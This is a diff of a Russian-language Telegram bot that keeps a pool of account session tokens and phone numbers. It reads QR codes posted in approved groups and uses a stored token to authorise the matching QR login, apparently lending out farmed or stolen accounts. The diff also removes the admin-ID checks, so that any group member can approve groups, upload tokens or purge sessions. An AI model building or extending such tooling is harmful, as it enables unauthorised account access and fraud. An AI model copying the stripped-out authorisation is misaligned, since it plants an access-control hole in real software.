@@ -20,7 +20,6 @@ logger = logging.getLogger(__name__)
 # === Конфигурация ===
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 DATABASE_URL = os.getenv("DATABASE_URL")
-ADMIN_IDS = {8540562276, 7742243877, 8706712229}
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -34,22 +33,8 @@ def read_qr(image: Image.Image) -> str | None:
         img = np.array(image.convert('RGB'))
         img = cv2.cvtColor(img, cv2.COLOR_RGB2BGR)
         detector = cv2.QRCodeDetector()
-        
-        # Попытка 0: инверсия для тёмной темы
-        inverted = cv2.bitwise_not(img)
-        data, bbox, _ = detector.detectAndDecode(inverted)
-        if data: return data
-        
-        # Попытка 0.5: адаптивная бинаризация для тёмной темы
-        gray_inv = cv2.cvtColor(inverted, cv2.COLOR_BGR2GRAY)
-        adaptive = cv2.adaptiveThreshold(gray_inv, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C, cv2.THRESH_BINARY, 11, 2)
-        data, bbox, _ = detector.detectAndDecode(adaptive)
-        if data: return data
-        
-        # Попытка 1: оригинал
         data, bbox, _ = detector.detectAndDecode(img)
         if data: return data
-        
         gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
         _, enhanced = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
         data, bbox, _ = detector.detectAndDecode(enhanced)
@@ -149,47 +134,51 @@ async def get_token_counts():
         alive = await conn.fetchval("SELECT COUNT(*) FROM tokens WHERE alive = TRUE")
         return total, alive
 
-def admin_panel_text(total, alive):
+def group_panel_text(total, alive):
     return f"📊 Токенов: {total}\n🟢 Доступно: {alive}\n🔴 Мёртвых: {total - alive}"
 
-def admin_panel_keyboard():
+def group_panel_keyboard():
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="Загрузить токены", callback_data="load_tokens")],
-        [InlineKeyboardButton(text="Очистить мёртвые сессии", callback_data="clear_dead_admin")]
+        [InlineKeyboardButton(text="Очистить мёртвые сессии", callback_data="clear_dead")]
     ])
 
-# === Команды ===
+# === Команда /start (в группе — панель) ===
 @dp.message(Command("start"))
 async def start_cmd(msg: Message):
-    if msg.chat.type == "private" and msg.from_user.id in ADMIN_IDS:
+    if msg.chat.type in ("group", "supergroup") and await is_group_approved(msg.chat.id):
         total, alive = await get_token_counts()
-        await msg.answer(admin_panel_text(total, alive), reply_markup=admin_panel_keyboard())
+        await msg.answer(group_panel_text(total, alive), reply_markup=group_panel_keyboard())
 
+# === Команда /cancel ===
 @dp.message(Command("cancel"))
 async def cancel_cmd(msg: Message):
     expecting_tokens.discard(msg.from_user.id)
-    if msg.from_user.id in ADMIN_IDS and msg.chat.type == "private":
+    if msg.chat.type in ("group", "supergroup") and await is_group_approved(msg.chat.id):
         total, alive = await get_token_counts()
-        await msg.answer(admin_panel_text(total, alive), reply_markup=admin_panel_keyboard())
+        await msg.answer(group_panel_text(total, alive), reply_markup=group_panel_keyboard())
 
+# === Команда /set (только из группы, любой может одобрить) ===
 @dp.message(Command("set"))
 async def set_cmd(msg: Message):
-    if msg.from_user.id not in ADMIN_IDS: return
+    if msg.chat.type not in ("group", "supergroup"): return
     try:
         await add_approved_group(int(msg.text.split()[1]))
         await msg.answer("✅ Группа одобрена")
     except (IndexError, ValueError):
         await msg.answer("❌ Используйте: /set ID_группы")
 
+# === Команда /unset ===
 @dp.message(Command("unset"))
 async def unset_cmd(msg: Message):
-    if msg.from_user.id not in ADMIN_IDS: return
+    if msg.chat.type not in ("group", "supergroup"): return
     try:
         await remove_approved_group(int(msg.text.split()[1]))
         await msg.answer("✅ Группа удалена")
     except (IndexError, ValueError):
         await msg.answer("❌ Используйте: /unset ID_группы")
 
+# === Команда /nums ===
 @dp.message(Command("nums"))
 async def nums_cmd(msg: Message):
     if msg.chat.type in ("group", "supergroup") and await is_group_approved(msg.chat.id):
@@ -199,27 +188,28 @@ async def nums_cmd(msg: Message):
 # === Callback'и ===
 @dp.callback_query(lambda c: c.data == "load_tokens")
 async def load_tokens_callback(callback: CallbackQuery):
-    if callback.from_user.id not in ADMIN_IDS:
+    if callback.message.chat.type not in ("group", "supergroup") or not await is_group_approved(callback.message.chat.id):
         return await callback.answer("Доступ запрещён", show_alert=True)
     expecting_tokens.add(callback.from_user.id)
     await callback.message.answer("📥 Отправьте токены. Каждый с новой строки.\n/cancel — отмена")
     await callback.answer()
 
-@dp.callback_query(lambda c: c.data == "clear_dead_admin")
-async def clear_dead_admin_callback(callback: CallbackQuery):
-    if callback.from_user.id not in ADMIN_IDS:
+@dp.callback_query(lambda c: c.data == "clear_dead")
+async def clear_dead_callback(callback: CallbackQuery):
+    if callback.message.chat.type not in ("group", "supergroup") or not await is_group_approved(callback.message.chat.id):
         return await callback.answer("Доступ запрещён", show_alert=True)
     count = await delete_dead_tokens()
     await callback.answer("Нет мёртвых сессий" if count == 0 else f"Очищено {count} мёртвых сессий", show_alert=True)
     total, alive = await get_token_counts()
-    await callback.message.edit_text(admin_panel_text(total, alive), reply_markup=admin_panel_keyboard())
+    await callback.message.edit_text(group_panel_text(total, alive), reply_markup=group_panel_keyboard())
 
 # === Единый обработчик ===
 @dp.message()
 async def unified_handler(msg: Message):
     if msg.text and msg.text.startswith("/"): return
 
-    if msg.chat.type == "private" and msg.from_user.id in ADMIN_IDS and msg.from_user.id in expecting_tokens:
+    # Загрузка токенов в группе
+    if msg.chat.type in ("group", "supergroup") and await is_group_approved(msg.chat.id) and msg.from_user.id in expecting_tokens:
         if msg.text:
             lines = [line.strip() for line in msg.text.strip().split("\n") if line.strip()]
             tokens = [extract_token(line) for line in lines if extract_token(line)]
@@ -237,6 +227,7 @@ async def unified_handler(msg: Message):
             else: await msg.answer(f"⚠️ Все {skipped} уже были в базе")
         return
 
+    # QR-скан в группе
     if msg.chat.type in ("group", "supergroup") and await is_group_approved(msg.chat.id) and msg.photo:
         if msg.message_id not in processing_tokens:
             processing_tokens.add(msg.message_id)
@@ -270,23 +261,18 @@ async def process_qr(msg: Message):
             token_id, token, phone = token_data["id"], token_data["token"], token_data["phone"]
             try:
                 client = Client(phone="+79990000000", work_dir="cache", session_name=f"qr_{token_id}.db", extra_config=ExtraConfig(token=token))
-                
                 start_task = asyncio.create_task(client.start())
-                
                 for _ in range(6):
                     if client.me and client.me.contact:
                         break
                     await asyncio.sleep(0.5)
-                
                 if not client.me or not client.me.contact:
                     start_task.cancel()
                     await mark_token_dead(token_id)
                     last_error = "Токены недействительны"
                     continue
-                
                 await client.authorize_qr_login(qr_data)
                 start_task.cancel()
-                
                 if not phone:
                     try:
                         if client.me and client.me.contact:
